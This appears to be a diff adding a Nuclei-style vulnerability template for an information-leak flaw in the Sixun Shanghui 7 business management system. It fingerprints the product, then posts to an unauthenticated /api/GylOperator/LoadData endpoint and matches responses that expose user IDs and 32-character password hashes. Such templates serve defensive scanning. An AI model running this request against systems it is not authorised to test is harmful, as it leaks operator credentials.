@@ -1,0 +1,42 @@
+id: sixun-shanghui7-bms-gyloperator-info-leak
+info:
+  name: 思迅商慧7商业管理系统 GylOperator 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "思迅商慧7商业管理系统"
+  - raw:
+      - |
+        POST /api/GylOperator/LoadData HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept: */*
+
+        loadAll=false&key=&oper_role=&gridFlag=GylOperatorList&page=1&rows=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"UserId\":"
+          - "\"success\":true"
+      - type: regex
+        part: body
+        regex:
+          - "\\\"Password\\\":\\\"[0-9A-Za-z]{32}\\\""
